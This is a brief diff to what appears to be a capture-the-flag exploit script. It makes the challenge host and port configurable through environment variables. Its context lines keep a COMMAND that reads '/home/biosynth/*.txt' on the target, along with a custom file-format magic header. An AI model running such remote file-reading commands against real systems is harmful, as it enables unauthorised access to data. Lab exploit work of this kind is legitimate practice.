@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+import os
 import base64
 import hashlib
 import struct
@@ -6,7 +7,9 @@ import urllib.parse
 
 import requests
 
-BASE_URL = "http://localhost:8000"
+host = os.getenv('CHALLENGE_HOST', 'localhost')
+port = os.getenv('CHALLENGE_PORT', '8000')
+BASE_URL = f'http://{host}:{port}'
 COMMAND  = "cat /home/biosynth/*.txt"
 
 MAGIC = b"BSF\x01"
